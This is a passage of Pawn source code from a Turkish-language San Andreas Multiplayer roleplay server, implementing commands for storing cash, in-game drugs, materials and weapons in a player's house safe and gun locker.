					format(string,sizeof(string), "* %s adlý kiþi cüzdanýndan biraz para çýkarýr ve evinin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) adlý kiþi evinin kasasýna $%d koydu (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklayabilecek paran yok.");
				}
			}
			else if(strcmp(choice, "pot", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pPot] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "Ayný anda 25 gramdan fazla saklayamazsýn.");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse2]][hPot] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Evin zaten pot dolu!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hPot]+=amount;
					PlayerInfo[playerid][pPot] -= amount;
					format(string, sizeof(string), "Evinin kasasýna %d gram pot koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s cebinden biraz pot çýkarýr ve evinin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of pot into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklamak için yeterli potun yok.");
				}
			}
			else if(strcmp(choice, "materyal", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pMats] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials]+=amount;
					PlayerInfo[playerid][pMats] -= amount;
					format(string, sizeof(string), "Evinin kasasýna %d materyal koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi biriz materyal çýkarýr ve evinin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %S) adlý kiþi evinin kasasýna %d materyal koydu (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklamak için yeterli materyalin yok.");
				}
			}
			else if(strcmp(choice, "crack", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pCrack] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "Ayný anda 25 gramdan fazla saklayamazsýn.");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Evinin kasasý zaten crack dolu!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack]+=amount;
					PlayerInfo[playerid][pCrack] -= amount;
					format(string, sizeof(string), "Evinin kasasýna %d gram crack koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi cebinden biraz crack çýkarýr ve evin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of crack into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklamak için yeterli crackin yok.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evekoy [isim] [miktar]");
				SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Para, Pot, Crack, Materyal");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Herhangi bir evin içinde deðilsin.");
	}
	return 1;
}

CMD:evkasasi(playerid, params[])
{
	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
		{
			new weaponsinlocker;
			for(new s = 0; s < 5; s++)
			{
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][s] != 0)
				{
					weaponsinlocker++;
				}
			}
			new string[80];
			format(string, sizeof(string), "Silahdolabý: %d/%d | Para: $%d | Pot: %d | Crack: %d | Materyal: %d", weaponsinlocker,HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade], HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney], HouseInfo[PlayerInfo[playerid][pHouse]][hPot], HouseInfo[PlayerInfo[playerid][pHouse]][hCrack], HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}

	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			new weaponsinlocker;
			for(new s = 0; s < 5; s++)
			{
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][s] != 0)
				{
					weaponsinlocker++;
				}
			}
			new string[80];
			format(string, sizeof(string), "Silahdolabý: %d/%d | Para: $%d | Pot: %d | Crack: %d | Materyal: %d", weaponsinlocker,HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade], HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney], HouseInfo[PlayerInfo[playerid][pHouse2]][hPot], HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack], HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}

	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Sahibi olduðun evin içinde deðilsin.");
	}
	return 1;
}

CMD:esilahal(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new string[128], slot;

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse])
		{
			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");

			if(sscanf(params, "d", slot))
			{
				new weaponname[50];
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				format(string, sizeof(string), "*** %s Kasa ***", GetPlayerNameEx(playerid));
		   		SendClientMessage(playerid, COLOR_WHITE, string);
				for(new s = 0; s < 5; s++)
				{
					if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][s] != 0)
					{
						GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][s], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "Slot %d: %s", s+1, weaponname);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /esilahal [slot]");
				return 1;
			}

			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "Silah dolabýndan baþka bir silah çýkarmak için %d saniye beklemen gerek.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}
			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Yanlýþ slot.");
				return 1;
			}
			if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] != 0)
			{
				new weaponname[50];
				GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1], weaponname, sizeof(weaponname));
				GivePlayerValidWeapon(playerid, HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1], 60000);
				HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] = 0;
				if(strcmp(weaponname, "silenced pistol", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Susturuculu tabancaný çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Susturuculu tabancasýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "desert eagle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Desert Eagle çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Desert Eagle'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Shotgun çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Shotgun'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "combat shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan SPAS-12 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan SPAS-12'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "mp5", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan MP5 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan MP5'ini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "ak47", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan AK-47 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan AK-47'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "m4", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan M4 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan M4'ünü çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Rifle çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Rifle'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "sniper rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Sniper Rifle çýkardýn.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* adlý kiþi evninin silah dolabýndan Sniper Rifle'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
                if(strcmp(weaponname, "micro smg", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Uzi çýkardýn.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Uzi'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				if(strcmp(weaponname, "tec9", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Uzi çýkardýn.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Uzi'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "Bu slotta sakladýðýn bir silah yok.");
				return 1;
			}
		}
	}
	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");

			if(sscanf(params, "d", slot))
			{
				new weaponname[50];
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				format(string, sizeof(string), "*** %s Kasa ***", GetPlayerNameEx(playerid));
		   		SendClientMessage(playerid, COLOR_WHITE, string);
				for(new s = 0; s < 5; s++)
				{
					if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][s] != 0)
					{
						GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][s], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "Slot %d: %s", s+1, weaponname);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
				SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /esilahal [slot]");
				return 1;
			}

			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "Silah dolabýndan baþka bir silah çýkarmak için %d saniye beklemen gerek.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}
			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Yanlýþ slot.");
				return 1;
			}
			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] != 0)
			{
				new weaponname[50];
				GetWeaponName(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1], weaponname, sizeof(weaponname));
				GivePlayerValidWeapon(playerid, HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1], 60000);
				HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] = 0;
				if(strcmp(weaponname, "silenced pistol", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Susturuculu tabancaný çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Susturuculu tabancasýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "desert eagle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Desert Eagle çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Desert Eagle'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Shotgun çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Shotgun'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "combat shotgun", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan SPAS-12 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan SPAS-12'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "mp5", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan MP5 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan MP5'ini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "ak47", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan AK-47 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan AK-47'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "m4", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan M4 çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan M4'ünü çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Rifle çýkardýn.");
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Rifle'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
				if(strcmp(weaponname, "sniper rifle", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Sniper Rifle çýkardýn.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* adlý kiþi evninin silah dolabýndan Sniper Rifle'ýný çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				if(strcmp(weaponname, "micro smg", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Uzi çýkardýn.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Uzi'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				if(strcmp(weaponname, "tec9", true, strlen(weaponname)) == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Silah dolabýndan Uzi çýkardýn.");
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
					format(string,sizeof(string), "* %s adlý kiþi evinin silah dolabýndan Uzi'sini çýkardý.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "Bu slotta sakladýðýn bir silah yok.");
				return 1;
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Herhangi bir evin içinde deðilsin.");
	}
	return 1;
}

CMD:esilahsakla(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu kullanamazsýn.");
		return 1;
	}
	new string[128], weaponchoice[32], slot;
	if(sscanf(params, "s[32]d", weaponchoice, slot)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /esilahsakla [silah] [slot]");

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
		{
			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "   Baþka bir silah koymadan önce %d saniye beklemelisin.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}

			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Yanlýþ slot.");
				return 1;
			}

			if(HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][slot-1] != 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu slotta zaten silahýn var.");
				return 1;
			}

			new weapon;
			if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Susturuculu tabancaný silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s adlý kiþi susturuculu tabancasýný evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Desert Eagle'ni silah dolabýna koydun.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s adlý kiþi Desert Eagle'sini evinin silah dolabýna yerleþtirdi.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
